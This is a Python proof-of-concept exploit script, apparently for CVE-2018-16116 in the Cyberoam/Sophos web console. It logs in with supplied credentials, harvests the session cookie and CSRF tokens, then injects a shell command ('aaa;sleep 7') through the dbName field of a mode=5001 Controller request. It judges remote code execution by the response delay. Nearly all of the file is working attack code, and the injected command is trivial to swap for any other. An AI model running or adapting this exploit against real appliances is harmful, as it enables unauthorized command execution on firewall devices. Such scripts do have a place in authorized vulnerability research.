# -*- coding=utf-8 -*-

from boofuzz import *
import ssl
import sys
import requests
import time
import urllib.parse

from requests.packages.urllib3.exceptions import InsecureRequestWarning, InsecurePlatformWarning
import warnings

# 过滤掉InsecureRequestWarning警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)

warnings.filterwarnings("ignore", category=UserWarning)


# def ad(target, fuzz_data_logger, session, *args, **kwargs):
#     print('--'*33)
#     global t
#     if (time.time() - t) > 3:
#         print(session.last_send)
#         fuzz_data_logger.log_check(session.last_send)
#
#     print('--'*33)

def extract_csrf_token(text):
    # page csrf key, refresh each visit
    s = text.find('c$rFt0k3n')
    e = text[s:].find(';')
    token = text[s + 13:s + e - 1]
    return token


def login_web():
    if len(sys.argv) != 5:
        sys.exit(
            'usage: {} target_ip port username password'.format(sys.argv[0]))

    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    session = Session(target=Target(
        connection=SSLSocketConnection(host=sys.argv[1], port=int(sys.argv[2]), sslcontext=ctx)),
        restart_threshold=1,
        # post_test_case_callbacks=[ad],
        receive_data_after_fuzz=True,
        # pre_send_callbacks=[gt],

    )
    session.num_mutations(1)

    # 1.login web console
    try:
        r = requests.post(url='https://{}:{}/webconsole/Controller'.format(
            sys.argv[1], sys.argv[2]),
            data='mode=151&json=%7B%22username%22%3A%22{}%22%2C%22password%22%3A%22{}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_87%22%7D&__RequestType=ajax&t='.format(
                sys.argv[3], sys.argv[4]) + str(int(time.time()) + 3600) + '999', verify=False,
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
                     'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
                     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                     'X-Requested-With': 'XMLHttpRequest'})
        c = r.cookies.items()[0][1]
        print(f"[D] JSESSIONID is: {c}")

        r = requests.get(url='https://{}:{}/webconsole/webpages/index.jsp'.format(sys.argv[1], sys.argv[2]), headers={
            'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
            'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
            'Cookie': 'JSESSIONID={}'.format(c)}, verify=False)

        # s = r.text.find('c$rFt0k3n')  # page csrf key
        # e = r.text[s:].find(';')
        # token = r.text[s + 13:s + e - 1]
        token = extract_csrf_token(r.text)

        print(f"[D] csrf token is: {token}")

        print("[D] response header: ", r.headers)
        # print(f"[D] response data: {r.text}")  # debug

        if 'Cyberoam.loginUserName = "admin"' in r.text:
            print(f"[I] Login web console success...")

        # login应该是完成了的，下一步是CVE-2018-16116
        # 测试路径访问：
        # 2. check visit url
        url2 = 'https://{}:{}/webconsole/webpages/logging/EventViewer.jsp?selectedTab=log_viewer&csrf={}'.format(
            sys.argv[1], sys.argv[2], token)

        print(f"url2 : {url2}")
        r = requests.get(
            url=url2,
            headers={
                'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
                'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
                'Cookie': 'JSESSIONID={}'.format(c)}, verify=False)

        # print("[D] step 2 response data: ", r.text)  # debug
        if "logviewerMainBody" in r.text:
            print(f"[I] Visit EventViewer page success...")
            # # 推测这里csrf_token应该是可以继续用的 todo verify
            csrf_token = extract_csrf_token(r.text)
            print(f"[D] EventViewer new csrf: {csrf_token}")

            # 根据观察JSESSIONID是不会变得
            url3 = 'https://{}:{}/webconsole/Controller'.format(sys.argv[1], sys.argv[2])
            print(f"url3 : {url3}")

            # data = "mode=5001&json={}"
            fuzz_args = "sleep 7"
            fuzz_time_value = int(fuzz_args.split(" ")[1])
            data = f"mode=5001&json=%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3B{fuzz_args}%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D&__RequestType=ajax&t={int(time.time())}007"

            # step3(csrf_token, c, url2)

            headers = {
                "Host": "172.16.16.16:4444",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
                "Accept": "text/plain, */*; q=0.01",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "X-CSRF-Token": csrf_token,
                "Content-Length": "17",
                "Origin": "https://172.16.16.16:4444",
                "Connection": "keep-alive",
                "Referer": url2,
                "Cookie": "JSESSIONID={}".format(c),
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            }

            # start_time
            st = time.time()

            r = requests.post(url=url3, verify=False,
                              data=data, headers=headers)

            print("[I] step3 response: ", r.text)

            # computed expired time
            delta_t = time.time() - st
            print(f"[D] wait time: {delta_t} seconds")

            # if delta_t >= 5:
            if delta_t >= fuzz_time_value:
                print("[I] RCE success ...")


    except Exception as e:
        print(e)


def step3(token, session_id, url2):
    # 3. execute RCE sleep 5 seconds
    url3 = 'https://{}:{}/webconsole/Controller'.format(sys.argv[1], sys.argv[2])
    print(f"url3 : {url3}")

    data = "mode=5001&json=%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3Bsleep%205%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D&__RequestType=ajax&t=1709545274008"

    st = time.time()

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': 'application/json, text/javascript, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Csrf-Token': token,
        'X-Csrf-Referer': url2,
        'Cookie': f'JSESSIONID={session_id}'
    }

    # payload = dict()
    # payload['mode'] = "5001"
    # payload[
    #     'json'] = "%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3Bsleep%205%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D"  # todo
    # payload['__RequestType'] = "ajax"
    # payload['t'] = f"{int(time.time())}000"

    r = requests.post(url=url3, verify=False,
                      data=data,
                      headers=headers
                      )

    print("[I] step3 response: ", r.text)

    delta_t = time.time() - st
    print(f"[D] wait time: {delta_t} seconds")

    if delta_t >= 5:
        print("[I] RCE success ...")


if __name__ == '__main__':
    login_web()
